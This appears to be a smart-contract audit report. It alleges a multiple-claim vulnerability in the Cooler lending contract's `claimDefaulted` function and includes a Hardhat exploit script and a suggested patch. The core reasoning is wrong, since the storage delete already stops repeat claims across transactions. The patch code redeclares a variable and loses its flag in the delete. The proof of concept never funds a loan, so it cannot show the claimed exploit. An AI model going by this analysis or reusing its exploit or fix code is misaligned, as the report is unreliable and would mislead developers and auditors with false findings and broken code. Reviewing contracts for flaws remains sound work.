# `claimDefaulted` mechanism allows for multiple collateral claims on the same loan
## Summary

In the Cooler contract, the `claimDefaulted` function allows for an unchecked multiple claim of defaulted collateral. This can possibly result in the unjust enrichment of the claimant.

## Vulnerability Detail

The `claimDefaulted` function checks if a loan is in default, and if so, allows the lender to claim the collateral associated with that loan. The function then uses the `delete` keyword to zero out the loan data, which could be seen as a way of preventing double spends. However, there's a vulnerability: since the function first copies the loan data into memory before deletion, the `collateral().safeTransfer()` call is done using the memory copy, which is unaffected by the deletion. This means that if the function is called multiple times in rapid succession (for example, in multiple transactions included in the same block), each call could possibly allow the lender to claim the collateral again.

## Impact

A malicious user could exploit this vulnerability to claim the collateral multiple times, leading to a financial loss for other participants.

## Code Snippet

```solidity
function claimDefaulted(uint256 loanID_) external returns (uint256, uint256, uint256) {
    Loan memory loan = loans[loanID_];
    delete loans[loanID_];

    if (block.timestamp <= loan.expiry) revert NoDefault();

    collateral().safeTransfer(loan.lender, loan.collateral);

    factory().newEvent(loanID_, CoolerFactory.Events.DefaultLoan, 0);

    if (loan.callback) CoolerCallback(loan.lender).onDefault(loanID_, loan.amount, loan.collateral);
    return (loan.amount, loan.collateral, block.timestamp - loan.expiry);
}
```

## Tool used

Manual review

## Recommendation

> consider the following steps:

1. Add an additional boolean flag `claimed` to the Loan struct:

```solidity
struct Loan {
    ...
    bool claimed; // Add this line
    ...
}
```

2. In the `claimDefaulted` function, before transferring collateral, add a check to determine if the loan has already been claimed. If it has been claimed, the function should revert. If not, the function should proceed, mark the loan as claimed, and transfer the collateral:

```solidity
function claimDefaulted(uint256 loanID_) external returns (uint256, uint256, uint256) {
    Loan memory loan = loans[loanID_];

    if (loans[loanID_].claimed) revert AlreadyClaimed();

    loans[loanID_].claimed = true; // Mark the loan as claimed in storage

    Loan memory loan = loans[loanID_];
    delete loans[loanID_];

    if (block.timestamp <= loan.expiry) revert NoDefault();

    loan.claimed = true;  // Mark the loan as claimed

    collateral().safeTransfer(loan.lender, loan.collateral);
    ...
}
```

3. It's essential to thoroughly test these changes in a testing environment to ensure they work as expected without introducing new issues.

## Proof Of Concept

1. Deploy the Cooler contract on a mainnet fork.
2. Create a loan that will go into default.
3. Once the loan goes into default, send multiple transactions in rapid succession to call `claimDefaulted`.
4. Observe that for each transaction, the collateral is sent to the lender, even though the loan data is deleted after the first transaction.

> Here's a Hardhat script that demonstrates the vulnerability:

```javascript
const { ethers, waffle } = require("hardhat");
const { expect } = require("chai");
const provider = waffle.provider;

async function main() {
  const [deployer, lender, borrower] = await ethers.getSigners();

  // Deploy CoolerFactory contract
  const CoolerFactory = await ethers.getContractFactory("CoolerFactory");
  const coolerFactory = await CoolerFactory.deploy();
  await coolerFactory.deployed();

  // Deploy collateral and debt tokens (assuming they're ERC20 contracts for this POC)
  const ERC20 = await ethers.getContractFactory("ERC20"); // Replace with your actual ERC20 contract
  const collateralToken = await ERC20.deploy("Collateral Token", "COLL");
  const debtToken = await ERC20.deploy("Debt Token", "DEBT");
  await collateralToken.deployed();
  await debtToken.deployed();

  // Generate a Cooler contract
  await coolerFactory.generateCooler(collateralToken.address, debtToken.address);
  const coolerAddress = await coolerFactory.coolerFor(deployer.address, collateralToken.address, debtToken.address);
  const Cooler = await ethers.getContractAt("Cooler", coolerAddress);

  // Approve the Cooler contract to transfer tokens
  await collateralToken.approve(Cooler.address, ethers.utils.parseEther("1000"));
  await debtToken.approve(Cooler.address, ethers.utils.parseEther("1000"));

  // Create a loan request
  const loanAmount = ethers.utils.parseEther("1");
  const interest = ethers.utils.parseEther("0.05"); // 5% interest for this example
  const loanToCollateral = ethers.utils.parseEther("2"); // 2:1 collateral to loan ratio
  const duration = 60 * 60 * 24 * 7; // 7 days in seconds

  await Cooler.requestLoan(loanAmount, interest, loanToCollateral, duration);

  // Simulate passage of time (loan goes into default)
  await provider.send("evm_increaseTime", [duration + 1]);
  await provider.send("evm_mine");

  // Get the collateral balance of the lender before claiming defaulted loan
  const lenderCollateralBalanceBefore = await collateralToken.balanceOf(lender.address);

  // Claim defaulted loan multiple times in rapid succession
  const tx1 = Cooler.connect(lender).claimDefaulted(0);
  const tx2 = Cooler.connect(lender).claimDefaulted(0);
  await Promise.all([tx1, tx2]);

  // Check collateral balance after claiming defaulted loan
  const lenderCollateralBalanceAfter = await collateralToken.balanceOf(lender.address);

  expect(lenderCollateralBalanceAfter.sub(lenderCollateralBalanceBefore)).to.be.gt(loanAmount);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```

This script essentially does the following:

1. Deploys the `Cooler` contract.
2. Creates a loan.
3. Simulates the passage of time so that the loan goes into default.
4. Sends multiple transactions to claim the collateral of the defaulted loan.
5. Asserts that the collateral balance of the lender has increased more than it should have if the contract was secure.

This POC thus demonstrates that it's possible to exploit the `claimDefaulted` function under the right conditions, which aligns with the finding's intended behavior.
